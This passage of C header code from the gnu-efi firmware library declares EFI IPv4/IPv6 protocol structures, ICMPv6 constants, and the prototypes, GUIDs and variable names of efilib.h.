} EFI_IP4_ROUTE_TABLE;

typedef struct {
    UINT8 Type;
    UINT8 Code;
} EFI_IP4_ICMP_TYPE;

typedef struct {
    BOOLEAN             IsStarted;
    UINT32              MaxPacketSize;
    EFI_IP4_CONFIG_DATA ConfigData;
    BOOLEAN             IsConfigured;
    UINT32              GroupCount;
    EFI_IPv4_ADDRESS    *GroupTable;
    UINT32              RouteCount;
    EFI_IP4_ROUTE_TABLE *RouteTable;
    UINT32              IcmpTypeCount;
    EFI_IP4_ICMP_TYPE   *IcmpTypeList;
} EFI_IP4_MODE_DATA;

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_GET_MODE_DATA) (
    IN struct _EFI_IP4                  *This,
    OUT EFI_IP4_MODE_DATA               *Ip4ModeData   OPTIONAL,
    OUT EFI_MANAGED_NETWORK_CONFIG_DATA *MnpConfigData OPTIONAL,
    OUT EFI_SIMPLE_NETWORK_MODE         *SnpModeData   OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_CONFIGURE) (
    IN struct _EFI_IP4     *This,
    IN EFI_IP4_CONFIG_DATA *IpConfigData OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_GROUPS) (
    IN struct _EFI_IP4  *This,
    IN BOOLEAN          JoinFlag,
    IN EFI_IPv4_ADDRESS *GroupAddress OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_ROUTES) (
    IN struct _EFI_IP4  *This,
    IN BOOLEAN          DeleteRoute,
    IN EFI_IPv4_ADDRESS *SubnetAddress,
    IN EFI_IPv4_ADDRESS *SubnetMask,
    IN EFI_IPv4_ADDRESS *GatewayAddress
    );

#pragma pack(1)
typedef struct {
    UINT8            HeaderLength:4;
    UINT8            Version:4;
    UINT8            TypeOfService;
    UINT16           TotalLength;
    UINT16           Identification;
    UINT16           Fragmentation;
    UINT8            TimeToLive;
    UINT8            Protocol;
    UINT16           Checksum;
    EFI_IPv4_ADDRESS SourceAddress;
    EFI_IPv4_ADDRESS DestinationAddress;
} EFI_IP4_HEADER;
#pragma pack()

typedef struct {
    UINT32 FragmentLength;
    VOID   *FragmentBuffer;
} EFI_IP4_FRAGMENT_DATA;

typedef struct {
    EFI_TIME              TimeStamp;
    EFI_EVENT             RecycleSignal;
    UINT32                HeaderLength;
    EFI_IP4_HEADER        *Header;
    UINT32                OptionsLength;
    VOID                  *Options;
    UINT32                DataLength;
    UINT32                FragmentCount;
    EFI_IP4_FRAGMENT_DATA FragmentTable[1];
} EFI_IP4_RECEIVE_DATA;

typedef struct {
    EFI_IPv4_ADDRESS SourceAddress;
    EFI_IPv4_ADDRESS GatewayAddress;
    UINT8            Protocol;
    UINT8            TypeOfService;
    UINT8            TimeToLive;
    BOOLEAN          DoNotFragment;
} EFI_IP4_OVERRIDE_DATA;

typedef struct {
    EFI_IPv4_ADDRESS      DestinationAddress;
    EFI_IP4_OVERRIDE_DATA *OverrideData;
    UINT32                OptionsLength;
    VOID                  *OptionsBuffer;
    UINT32                TotalDataLength;
    UINT32                FragmentCount;
    EFI_IP4_FRAGMENT_DATA FragmentTable[1];
} EFI_IP4_TRANSMIT_DATA;

typedef struct {
    EFI_EVENT                 Event;
    EFI_STATUS                Status;
    union {
        EFI_IP4_RECEIVE_DATA  *RxData;
        EFI_IP4_TRANSMIT_DATA *TxData;
    } Packet;
} EFI_IP4_COMPLETION_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_TRANSMIT) (
    IN struct _EFI_IP4          *This,
    IN EFI_IP4_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_RECEIVE) (
    IN struct _EFI_IP4          *This,
    IN EFI_IP4_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_CANCEL)(
    IN struct _EFI_IP4          *This,
    IN EFI_IP4_COMPLETION_TOKEN *Token OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP4_POLL) (
    IN struct _EFI_IP4 *This
    );

typedef struct _EFI_IP4 {
    EFI_IP4_GET_MODE_DATA GetModeData;
    EFI_IP4_CONFIGURE     Configure;
    EFI_IP4_GROUPS        Groups;
    EFI_IP4_ROUTES        Routes;
    EFI_IP4_TRANSMIT      Transmit;
    EFI_IP4_RECEIVE       Receive;
    EFI_IP4_CANCEL        Cancel;
    EFI_IP4_POLL          Poll;
} EFI_IP4;

typedef struct {
    UINT8            DefaultProtocol;
    BOOLEAN          AcceptAnyProtocol;
    BOOLEAN          AcceptIcmpErrors;
    BOOLEAN          AcceptPromiscuous;
    EFI_IPv6_ADDRESS DestinationAddress;
    EFI_IPv6_ADDRESS StationAddress;
    UINT8            TrafficClass;
    UINT8            HopLimit;
    UINT32           FlowLabel;
    UINT32           ReceiveTimeout;
    UINT32           TransmitTimeout;
} EFI_IP6_CONFIG_DATA;

typedef struct {
    EFI_IPv6_ADDRESS Address;
    UINT8            PrefixLength;
} EFI_IP6_ADDRESS_INFO;

typedef struct {
    EFI_IPv6_ADDRESS Gateway;
    EFI_IPv6_ADDRESS Destination;
    UINT8            PrefixLength;
} EFI_IP6_ROUTE_TABLE;

typedef enum {
    EfiNeighborInComplete,
    EfiNeighborReachable,
    EfiNeighborStale,
    EfiNeighborDelay,
    EfiNeighborProbe
} EFI_IP6_NEIGHBOR_STATE;

typedef struct {
    EFI_IPv6_ADDRESS       Neighbor;
    EFI_MAC_ADDRESS        LinkAddress;
    EFI_IP6_NEIGHBOR_STATE State;
} EFI_IP6_NEIGHBOR_CACHE;

typedef struct {
    UINT8 Type;
    UINT8 Code;
} EFI_IP6_ICMP_TYPE;

//***********************************************************
// ICMPv6 type definitions for error messages
//***********************************************************
#define ICMP_V6_DEST_UNREACHABLE     0x1
#define ICMP_V6_PACKET_TOO_BIG       0x2
#define ICMP_V6_TIME_EXCEEDED        0x3
#define ICMP_V6_PARAMETER_PROBLEM    0x4

//***********************************************************
// ICMPv6 type definition for informational messages
//***********************************************************
#define ICMP_V6_ECHO_REQUEST         0x80
#define ICMP_V6_ECHO_REPLY           0x81
#define ICMP_V6_LISTENER_QUERY       0x82
#define ICMP_V6_LISTENER_REPORT      0x83
#define ICMP_V6_LISTENER_DONE        0x84
#define ICMP_V6_ROUTER_SOLICIT       0x85
#define ICMP_V6_ROUTER_ADVERTISE     0x86
#define ICMP_V6_NEIGHBOR_SOLICIT     0x87
#define ICMP_V6_NEIGHBOR_ADVERTISE   0x88
#define ICMP_V6_REDIRECT             0x89
#define ICMP_V6_LISTENER_REPORT_2    0x8F

//***********************************************************
// ICMPv6 code definitions for ICMP_V6_DEST_UNREACHABLE
//***********************************************************
#define ICMP_V6_NO_ROUTE_TO_DEST     0x0
#define ICMP_V6_COMM_PROHIBITED      0x1
#define ICMP_V6_BEYOND_SCOPE         0x2
#define ICMP_V6_ADDR_UNREACHABLE     0x3
#define ICMP_V6_PORT_UNREACHABLE     0x4
#define ICMP_V6_SOURCE_ADDR_FAILED   0x5
#define ICMP_V6_ROUTE_REJECTED       0x6

//***********************************************************
// ICMPv6 code definitions for ICMP_V6_TIME_EXCEEDED
//***********************************************************
#define ICMP_V6_TIMEOUT_HOP_LIMIT    0x0
#define ICMP_V6_TIMEOUT_REASSEMBLE   0x1

//***********************************************************
// ICMPv6 code definitions for ICMP_V6_PARAMETER_PROBLEM
//***********************************************************
#define ICMP_V6_ERRONEOUS_HEADER     0x0
#define ICMP_V6_UNRECOGNIZE_NEXT_HDR 0x1
#define ICMP_V6_UNRECOGNIZE_OPTION   0x2

typedef struct {
    BOOLEAN                IsStarted;
    UINT32                 MaxPacketSize;
    EFI_IP6_CONFIG_DATA    ConfigData;
    BOOLEAN                IsConfigured;
    UINT32                 AddressCount;
    EFI_IP6_ADDRESS_INFO   *AddressList;
    UINT32                 GroupCount;
    EFI_IPv6_ADDRESS       *GroupTable;
    UINT32                 RouteCount;
    EFI_IP6_ROUTE_TABLE    *RouteTable;
    UINT32                 NeighborCount;
    EFI_IP6_NEIGHBOR_CACHE *NeighborCache;
    UINT32                 PrefixCount;
    EFI_IP6_ADDRESS_INFO   *PrefixTable;
    UINT32                 IcmpTypeCount;
    EFI_IP6_ICMP_TYPE      *IcmpTypeList;
} EFI_IP6_MODE_DATA;

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_GET_MODE_DATA) (
    IN struct _EFI_IP6                  *This,
    OUT EFI_IP6_MODE_DATA               *Ip6ModeData   OPTIONAL,
    OUT EFI_MANAGED_NETWORK_CONFIG_DATA *MnpConfigData OPTIONAL,
    OUT EFI_SIMPLE_NETWORK_MODE         *SnpModeData   OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_CONFIGURE) (
    IN struct _EFI_IP6     *This,
    IN EFI_IP6_CONFIG_DATA *Ip6ConfigData OPTIONAL
    );
typedef
EFI_STATUS
(EFIAPI *EFI_IP6_GROUPS) (
    IN struct _EFI_IP6  *This,
    IN BOOLEAN          JoinFlag,
    IN EFI_IPv6_ADDRESS *GroupAddress OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_ROUTES) (
    IN struct _EFI_IP6  *This,
    IN BOOLEAN          DeleteRoute,
    IN EFI_IPv6_ADDRESS *Destination    OPTIONAL,
    IN UINT8            PrefixLength,
    IN EFI_IPv6_ADDRESS *GatewayAddress OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_NEIGHBORS) (
    IN struct _EFI_IP6  *This,
    IN BOOLEAN          DeleteFlag,
    IN EFI_IPv6_ADDRESS *TargetIp6Address,
    IN EFI_MAC_ADDRESS  *TargetLinkAddress OPTIONAL,
    IN UINT32           Timeout,
    IN BOOLEAN          Override
    );

typedef struct _EFI_IP6_FRAGMENT_DATA {
    UINT32 FragmentLength;
    VOID   *FragmentBuffer;
} EFI_IP6_FRAGMENT_DATA;

typedef struct _EFI_IP6_OVERRIDE_DATA {
    UINT8  Protocol;
    UINT8  HopLimit;
    UINT32 FlowLabel;
} EFI_IP6_OVERRIDE_DATA;

typedef struct _EFI_IP6_TRANSMIT_DATA {
    EFI_IPv6_ADDRESS      DestinationAddress;
    EFI_IP6_OVERRIDE_DATA *OverrideData;
    UINT32                ExtHdrsLength;
    VOID                  *ExtHdrs;
    UINT8                 NextHeader;
    UINT32                DataLength;
    UINT32                FragmentCount;
    EFI_IP6_FRAGMENT_DATA FragmentTable[1];
} EFI_IP6_TRANSMIT_DATA;

#pragma pack(1)
typedef struct _EFI_IP6_HEADER {
    UINT8            TrafficClassH:4;
    UINT8            Version:4;
    UINT8            FlowLabelH:4;
    UINT8            TrafficClassL:4;
    UINT16           FlowLabelL;
    UINT16           PayloadLength;
    UINT8            NextHeader;
    UINT8            HopLimit;
    EFI_IPv6_ADDRESS SourceAddress;
    EFI_IPv6_ADDRESS DestinationAddress;
} EFI_IP6_HEADER;
#pragma pack()

typedef struct _EFI_IP6_RECEIVE_DATA {
    EFI_TIME              TimeStamp;
    EFI_EVENT             RecycleSignal;
    UINT32                HeaderLength;
    EFI_IP6_HEADER        *Header;
    UINT32                DataLength;
    UINT32                FragmentCount;
    EFI_IP6_FRAGMENT_DATA FragmentTable[1];
} EFI_IP6_RECEIVE_DATA;

typedef struct {
    EFI_EVENT                 Event;
    EFI_STATUS                Status;
    union {
	EFI_IP6_RECEIVE_DATA  *RxData;
	EFI_IP6_TRANSMIT_DATA *TxData;
    }                         Packet;
} EFI_IP6_COMPLETION_TOKEN;

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_TRANSMIT) (
    IN struct _EFI_IP6          *This,
    IN EFI_IP6_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_RECEIVE) (
    IN struct _EFI_IP6          *This,
    IN EFI_IP6_COMPLETION_TOKEN *Token
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_CANCEL)(
    IN struct _EFI_IP6          *This,
    IN EFI_IP6_COMPLETION_TOKEN *Token OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP6_POLL) (
    IN struct _EFI_IP6 *This
    );

typedef struct _EFI_IP6 {
    EFI_IP6_GET_MODE_DATA GetModeData;
    EFI_IP6_CONFIGURE     Configure;
    EFI_IP6_GROUPS        Groups;
    EFI_IP6_ROUTES        Routes;
    EFI_IP6_NEIGHBORS     Neighbors;
    EFI_IP6_TRANSMIT      Transmit;
    EFI_IP6_RECEIVE       Receive;
    EFI_IP6_CANCEL        Cancel;
    EFI_IP6_POLL          Poll;
} EFI_IP6;

#endif /* _EFI_IP_H */

```

`include/gnu-efi/efilib.h`:

```h
#ifndef _EFILIB_INCLUDE_
#define _EFILIB_INCLUDE_

/*++

Copyright (c) 2000  Intel Corporation

Module Name:

    efilib.h

Abstract:

    EFI library functions



Revision History

--*/

#include "efidebug.h"
#include "efipart.h"
#if defined(_M_X64) || defined(__x86_64__) || defined(__amd64__)
#include "x86_64/efilibplat.h"
#elif defined(_M_IX86) || defined(__i386__)
#include "ia32/efilibplat.h"
#elif defined(_M_IA64) || defined(__ia64__)
#include "ia64/efilibplat.h"
#elif defined (_M_ARM64) || defined(__aarch64__)
#include "aarch64/efilibplat.h"
#elif defined (_M_ARM) || defined(__arm__)
#include "arm/efilibplat.h"
#elif defined (_M_MIPS64) || defined(__mips64__)
#include "mips64el/efilibplat.h"
#elif defined (__riscv) && __riscv_xlen == 64
#include "riscv64/efilibplat.h"
#endif
#include "efilink.h"
#include "efirtlib.h"
#include "efistdarg.h"
#include "pci22.h"
#include "libsmbios.h"

//
// Public read-only data in the EFI library
//

extern EFI_SYSTEM_TABLE         *ST;
#define gST                      ST
extern EFI_BOOT_SERVICES        *BS;
#define gBS                      BS
extern EFI_RUNTIME_SERVICES     *RT;
#define gRT                      RT

extern EFI_GUID gEfiDevicePathProtocolGuid;
#define DevicePathProtocol gEfiDevicePathProtocolGuid
extern EFI_GUID gEfiDevicePathToTextProtocolGuid;
#define DevicePathToTextProtocol gEfiDevicePathToTextProtocolGuid
extern EFI_GUID gEfiDevicePathFromTextProtocolGuid;
#define DevicePathFromTextProtocol gEfiDevicePathFromTextProtocolGuid
extern EFI_GUID gEfiDevicePathUtilitiesProtocolGuid;
#define DevicePathUtilitiesProtocol gEfiDevicePathUtilitiesProtocolGuid
extern EFI_GUID gEfiLoadedImageProtocolGuid;
#define LoadedImageProtocol gEfiLoadedImageProtocolGuid
extern EFI_GUID gEfiSimpleTextInProtocolGuid;
#define TextInProtocol gEfiSimpleTextInProtocolGuid
extern EFI_GUID gEfiSimpleTextOutProtocolGuid;
#define TextOutProtocol gEfiSimpleTextOutProtocolGuid
extern EFI_GUID gEfiGraphicsOutputProtocolGuid;
#define GraphicsOutputProtocol gEfiGraphicsOutputProtocolGuid
extern EFI_GUID gEfiEdidDiscoveredProtocolGuid;
#define EdidDiscoveredProtocol gEfiEdidDiscoveredProtocolGuid
extern EFI_GUID gEfiEdidActiveProtocolGuid;
#define EdidActiveProtocol gEfiEdidActiveProtocolGuid
extern EFI_GUID gEfiEdidOverrideProtocolGuid;
#define EdidOverrideProtocol gEfiEdidOverrideProtocolGuid
extern EFI_GUID gEfiBlockIoProtocolGuid;
#define BlockIoProtocol gEfiBlockIoProtocolGuid
extern EFI_GUID gEfiBlockIo2ProtocolGuid;
#define BlockIo2Protocol gEfiBlockIo2ProtocolGuid
extern EFI_GUID gEfiDiskIoProtocolGuid;
#define DiskIoProtocol gEfiDiskIoProtocolGuid
extern EFI_GUID gEfiDiskIo2ProtocolGuid;
#define DiskIo2Protocol gEfiDiskIo2ProtocolGuid
extern EFI_GUID gEfiSimpleFileSystemProtocolGuid;
#define FileSystemProtocol gEfiSimpleFileSystemProtocolGuid
extern EFI_GUID gEfiLoadFileProtocolGuid;
#define LoadFileProtocol gEfiLoadFileProtocolGuid
extern EFI_GUID gEfiDeviceIoProtocolGuid;
#define DeviceIoProtocol gEfiDeviceIoProtocolGuid
extern EFI_GUID VariableStoreProtocol;
extern EFI_GUID LegacyBootProtocol;
extern EFI_GUID gEfiUnicodeCollationProtocolGuid;
#define UnicodeCollationProtocol gEfiUnicodeCollationProtocolGuid
extern EFI_GUID gEfiSerialIoProtocolGuid;
#define SerialIoProtocol gEfiSerialIoProtocolGuid
extern EFI_GUID VgaClassProtocol;
extern EFI_GUID TextOutSpliterProtocol;
extern EFI_GUID ErrorOutSpliterProtocol;
extern EFI_GUID TextInSpliterProtocol;
extern EFI_GUID gEfiSimpleNetworkProtocolGuid;
#define SimpleNetworkProtocol gEfiSimpleNetworkProtocolGuid
extern EFI_GUID gEfiPxeBaseCodeProtocolGuid;
#define PxeBaseCodeProtocol gEfiPxeBaseCodeProtocolGuid
extern EFI_GUID gEfiPxeBaseCodeCallbackProtocolGuid;
#define PxeCallbackProtocol gEfiPxeBaseCodeCallbackProtocolGuid
extern EFI_GUID gEfiNetworkInterfaceIdentifierProtocolGuid;
#define NetworkInterfaceIdentifierProtocol gEfiNetworkInterfaceIdentifierProtocolGuid
extern EFI_GUID gEFiUiInterfaceProtocolGuid;
#define UiProtocol gEFiUiInterfaceProtocolGuid
extern EFI_GUID InternalShellProtocol;
extern EFI_GUID gEfiPciIoProtocolGuid;
#define PciIoProtocol gEfiPciIoProtocolGuid
extern EFI_GUID gEfiPciRootBridgeIoProtocolGuid;
extern EFI_GUID gEfiDriverBindingProtocolGuid;
#define DriverBindingProtocol gEfiDriverBindingProtocolGuid
extern EFI_GUID gEfiComponentNameProtocolGuid;
#define ComponentNameProtocol gEfiComponentNameProtocolGuid
extern EFI_GUID gEfiComponentName2ProtocolGuid;
#define ComponentName2Protocol gEfiComponentName2ProtocolGuid
extern EFI_GUID gEfiHashProtocolGuid;
#define HashProtocol gEfiHashProtocolGuid
extern EFI_GUID gEfiPlatformDriverOverrideProtocolGuid;
#define PlatformDriverOverrideProtocol gEfiPlatformDriverOverrideProtocolGuid
extern EFI_GUID gEfiBusSpecificDriverOverrideProtocolGuid;
#define BusSpecificDriverOverrideProtocol gEfiBusSpecificDriverOverrideProtocolGuid
extern EFI_GUID gEfiDriverFamilyOverrideProtocolGuid;
#define DriverFamilyOverrideProtocol gEfiDriverFamilyOverrideProtocolGuid
extern EFI_GUID gEfiEbcProtocolGuid;

extern EFI_GUID gEfiGlobalVariableGuid;
#define EfiGlobalVariable gEfiGlobalVariableGuid
extern EFI_GUID gEfiFileInfoGuid;
#define GenericFileInfo gEfiFileInfoGuid
extern EFI_GUID gEfiFileSystemInfoGuid;
#define FileSystemInfo gEfiFileSystemInfoGuid
extern EFI_GUID gEfiFileSystemVolumeLabelInfoIdGuid;
#define FileSystemVolumeLabelInfo gEfiFileSystemVolumeLabelInfoIdGuid
extern EFI_GUID gEfiPcAnsiGuid;
#define PcAnsiProtocol gEfiPcAnsiGuid
extern EFI_GUID gEfiVT100Guid;
#define Vt100Protocol gEfiVT100Guid
extern EFI_GUID gEfiVT100PlusGuid;
extern EFI_GUID gEfiVTUTF8Guid;

extern EFI_GUID NullGuid;
extern EFI_GUID UnknownDevice;

extern EFI_GUID EfiPartTypeSystemPartitionGuid;
extern EFI_GUID EfiPartTypeLegacyMbrGuid;

extern EFI_GUID MpsTableGuid;
extern EFI_GUID AcpiTableGuid;
extern EFI_GUID SMBIOSTableGuid;
extern EFI_GUID SMBIOS3TableGuid;
extern EFI_GUID SalSystemTableGuid;
extern EFI_GUID EfiDtbTableGuid;

extern EFI_GUID SimplePointerProtocol;
extern EFI_GUID AbsolutePointerProtocol;

extern EFI_GUID gEfiDebugImageInfoTableGuid;
extern EFI_GUID gEfiDebugSupportProtocolGuid;

extern EFI_GUID SimpleTextInputExProtocol;

extern EFI_GUID ShellProtocolGuid;
extern EFI_GUID ShellParametersProtocolGuid;
extern EFI_GUID ShellDynamicCommandProtocolGuid;

//
// EFI Variable strings
//
#define LOAD_OPTION_ACTIVE      0x00000001

#define VarLanguageCodes       L"LangCodes"
#define VarLanguage            L"Lang"
#define VarTimeout             L"Timeout"
#define VarConsoleInp          L"ConIn"
#define VarConsoleOut          L"ConOut"
#define VarErrorOut            L"ErrOut"
#define VarBootOption          L"Boot%04x"
#define VarBootOrder           L"BootOrder"
#define VarBootNext            L"BootNext"
#define VarBootCurrent         L"BootCurrent"
#define VarDriverOption        L"Driver%04x"
#define VarDriverOrder         L"DriverOrder"
#define VarConsoleInpDev       L"ConInDev"
#define VarConsoleOutDev       L"ConOutDev"
#define VarErrorOutDev         L"ErrOutDev"

#define LanguageCodeEnglish    "eng"

extern EFI_DEVICE_PATH RootDevicePath[];
extern EFI_DEVICE_PATH EndDevicePath[];
extern EFI_DEVICE_PATH EndInstanceDevicePath[];

//
// Other public data in the EFI library
//

extern EFI_MEMORY_TYPE PoolAllocationType;

//
// STATIC - Name is internal to the module
// INTERNAL - Name is internal to the component (i.e., directory)
// BOOTSERVCE - Name of a boot service function
//

#define STATIC
#define INTERNAL
#define BOOTSERVICE

//
// Prototypes
//

VOID
InitializeLib (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );

VOID
InitializeUnicodeSupport (
    CHAR8 *LangCode
    );

VOID
EFIDebugVariable (
    VOID
    );

VOID
Exit(
    IN EFI_STATUS   ExitStatus,
    IN UINTN        ExitDataSize,
    IN CHAR16       *ExitData OPTIONAL
    );

INTN
GetShellArgcArgv(
    EFI_HANDLE ImageHandle,
    CHAR16 **Argv[]  /* Statically allocated */
    );

VOID
SetCrc (
    IN OUT EFI_TABLE_HEADER *Hdr
    );

VOID
SetCrcAltSize (
    IN UINTN                 Size,
    IN OUT EFI_TABLE_HEADER *Hdr
    );

BOOLEAN
CheckCrc (
    IN UINTN                 MaxSize,
    IN OUT EFI_TABLE_HEADER *Hdr
    );

BOOLEAN
CheckCrcAltSize (
    IN UINTN                 MaxSize,
    IN UINTN                 Size,
    IN OUT EFI_TABLE_HEADER *Hdr
    );

UINT32
CalculateCrc (
    UINT8 *pt,
    UINTN Size
    );

VOID
ZeroMem (
    IN VOID     *Buffer,
    IN UINTN     Size
    );

VOID
SetMem (
    IN VOID     *Buffer,
    IN UINTN    Size,
    IN UINT8    Value
    );

VOID
CopyMem (
    IN VOID     *Dest,
    IN CONST VOID     *Src,
    IN UINTN    len
    );

INTN
CompareMem (
    IN CONST VOID     *Dest,
    IN CONST VOID     *Src,
    IN UINTN    len
    );

INTN
StrCmp (
    IN CONST CHAR16   *s1,
    IN CONST CHAR16   *s2
    );

INTN
StrnCmp (
    IN CONST CHAR16   *s1,
    IN CONST CHAR16   *s2,
    IN UINTN    len
    );

INTN
StriCmp (
    IN CONST CHAR16   *s1,
    IN CONST CHAR16   *s2
    );

VOID
StrLwr (
    IN CHAR16   *Str
    );

VOID
StrUpr (
    IN CHAR16   *Str
    );

VOID
StrCpy (
    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src
    );

VOID
StrnCpy (
    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src,
    IN UINTN     Len
    );

CHAR16 *
StpCpy (
    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src
    );

CHAR16 *
StpnCpy (
    IN CHAR16   *Dest,
    IN CONST CHAR16    *Src,
    IN UINTN     Len
    );

VOID
StrCat (
    IN CHAR16   *Dest,
    IN CONST CHAR16   *Src
    );

VOID
StrnCat (
    IN CHAR16   *Dest,
    IN CONST CHAR16   *Src,
    IN UINTN     Len
    );

UINTN
StrLen (
    IN CONST CHAR16   *s1
    );

UINTN
StrnLen (
    IN CONST CHAR16   *s1,
    IN UINTN           Len
    );

UINTN
StrSize (
    IN CONST CHAR16   *s1
    );

CHAR16 *
StrDuplicate (
    IN CONST CHAR16   *Src
    );

UINTN
strlena (
    IN CONST CHAR8    *s1
    );

UINTN
strcmpa (
    IN CONST CHAR8    *s1,
    IN CONST CHAR8    *s2
    );

UINTN
strncmpa (
    IN CONST CHAR8    *s1,
    IN CONST CHAR8    *s2,
    IN UINTN    len
    );

UINTN
xtoi (
    CONST CHAR16      *str
    );

UINTN
Atoi (
    CONST CHAR16  *str
    );

BOOLEAN
MetaMatch (
    IN CHAR16   *String,
    IN CHAR16   *Pattern
    );

BOOLEAN
MetaiMatch (
    IN CHAR16   *String,
    IN CHAR16   *Pattern
    );

UINT64
LShiftU64 (
    IN UINT64   Operand,
    IN UINTN    Count
    );

UINT64
RShiftU64 (
    IN UINT64   Operand,
    IN UINTN    Count
    );

UINT64
MultU64x32 (
    IN UINT64   Multiplicand,
    IN UINTN    Multiplier
    );

UINT64
DivU64x32 (
    IN UINT64   Dividend,
    IN UINTN    Divisor,
    OUT UINTN   *Remainder OPTIONAL
    );

VOID
InitializeLock (
    IN OUT FLOCK    *Lock,
    IN EFI_TPL  Priority
    );

VOID
AcquireLock (
    IN FLOCK    *Lock
    );

VOID
ReleaseLock (
    IN FLOCK    *Lock
    );


INTN
CompareGuid(
    IN EFI_GUID     *Guid1,
    IN EFI_GUID     *Guid2
    );

VOID *
AllocatePool (
    IN UINTN     Size
    );

VOID *
AllocateZeroPool (
    IN UINTN     Size
    );

VOID *
ReallocatePool (
    IN VOID                 *OldPool,
    IN UINTN                OldSize,
    IN UINTN                NewSize
    );

VOID
FreePool (
    IN VOID     *p
    );


VOID
Output (
    IN CHAR16   *Str
    );

VOID
Input (
    IN CHAR16   *Prompt OPTIONAL,
    OUT CHAR16  *InStr,
    IN UINTN    StrLen
    );

VOID
IInput (
    IN SIMPLE_TEXT_OUTPUT_INTERFACE     *ConOut,
    IN SIMPLE_INPUT_INTERFACE           *ConIn,
    IN CHAR16                           *Prompt OPTIONAL,
    OUT CHAR16                          *InStr,
    IN UINTN                            StrLen
    );

UINTN
Print (
    IN CONST CHAR16   *fmt,
    ...
    );

UINTN
VPrint (
    IN CONST CHAR16   *fmt,
    va_list           args
    );

UINTN
UnicodeSPrint (
    OUT CHAR16        *Str,
    IN UINTN          StrSize,
    IN CONST CHAR16   *fmt,
    ...
    );

UINTN
UnicodeVSPrint (
    OUT CHAR16        *Str,
    IN UINTN          StrSize,
    IN CONST CHAR16   *fmt,
    va_list           args
    );

CHAR16 *
VPoolPrint (
    IN CONST CHAR16     *fmt,
    va_list             args
    );

CHAR16 *
PoolPrint (
    IN CONST CHAR16     *fmt,
    ...
    );

typedef struct {
    CHAR16      *str;
    UINTN       len;
    UINTN       maxlen;
} POOL_PRINT;

CHAR16 *
CatPrint (
    IN OUT POOL_PRINT   *Str,
    IN CONST CHAR16     *fmt,
    ...
    );

UINTN
PrintAt (
    IN UINTN         Column,
    IN UINTN         Row,
    IN CONST CHAR16  *fmt,
    ...
    );

UINTN
IPrint (
    IN SIMPLE_TEXT_OUTPUT_INTERFACE    *Out,
    IN CONST CHAR16                    *fmt,
    ...
    );

UINTN
IPrintAt (
    IN SIMPLE_TEXT_OUTPUT_INTERFACE     *Out,
    IN UINTN                            Column,
    IN UINTN                            Row,
    IN CONST CHAR16                     *fmt,
    ...
    );

UINTN
AsciiPrint (
    IN CONST CHAR8    *fmt,
    ...
    );

UINTN
AsciiVSPrint(
    OUT CHAR8         *Str,
    IN  UINTN         StrSize,
    IN  CONST CHAR8   *fmt,
    va_list           args
);

//
// For compatibility with previous gnu-efi versions
//
#define SPrint      UnicodeSPrint
#define VSPrint     UnicodeVSPrint
#define APrint      AsciiPrint

VOID
ValueToHex (
    IN CHAR16   *Buffer,
    IN UINT64   v
    );

VOID
ValueToString (
    IN CHAR16   *Buffer,
    IN BOOLEAN  Comma,
    IN INT64    v
    );

VOID
FloatToString (
    IN CHAR16   *Buffer,
    IN BOOLEAN  Comma,
    IN double    v
    );

VOID
TimeToString (
    OUT CHAR16      *Buffer,
    IN EFI_TIME     *Time
    );

VOID
GuidToString (
    OUT CHAR16      *Buffer,
    IN EFI_GUID     *Guid
    );

VOID
StatusToString (
    OUT CHAR16      *Buffer,
    EFI_STATUS      Status
    );

VOID
DumpHex (
    IN UINTN        Indent,
    IN UINTN        Offset,
    IN UINTN        DataSize,
    IN VOID         *UserData
    );

BOOLEAN
GrowBuffer(
    IN OUT EFI_STATUS   *Status,
    IN OUT VOID         **Buffer,
    IN UINTN            BufferSize
    );

EFI_MEMORY_DESCRIPTOR *
LibMemoryMap (
    OUT UINTN               *NoEntries,
    OUT UINTN               *MapKey,
    OUT UINTN               *DescriptorSize,
    OUT UINT32              *DescriptorVersion
    );

VOID *
LibGetVariable (
    IN CHAR16               *Name,
    IN EFI_GUID             *VendorGuid
    );

VOID *
LibGetVariableAndSize (
    IN CHAR16               *Name,
    IN EFI_GUID             *VendorGuid,
    OUT UINTN               *VarSize
    );

EFI_STATUS
LibDeleteVariable (
    IN CHAR16   *VarName,
    IN EFI_GUID *VarGuid
    );

EFI_STATUS
LibSetNVVariable (
    IN CHAR16   *VarName,
    IN EFI_GUID *VarGuid,
    IN UINTN	 DataSize,
    IN VOID     *Data
    );

EFI_STATUS
LibSetVariable (
    IN CHAR16   *VarName,
    IN EFI_GUID *VarGuid,
    IN UINTN	 DataSize,
    IN VOID     *Data
    );
EFI_STATUS
LibInsertToTailOfBootOrder (
    IN  UINT16  BootOption,
    IN  BOOLEAN OnlyInsertIfEmpty
    );

EFI_STATUS
LibLocateProtocol (
    IN  EFI_GUID    *ProtocolGuid,
    OUT VOID        **Interface
    );

EFI_STATUS
LibLocateHandle (
    IN EFI_LOCATE_SEARCH_TYPE   SearchType,
    IN EFI_GUID                 *Protocol OPTIONAL,
    IN VOID                     *SearchKey OPTIONAL,
    IN OUT UINTN                *NoHandles,
    OUT EFI_HANDLE              **Buffer
    );

EFI_STATUS
LibLocateHandleByDiskSignature (
    IN UINT8                        MBRType,
    IN UINT8                        SignatureType,
    IN VOID                         *Signature,
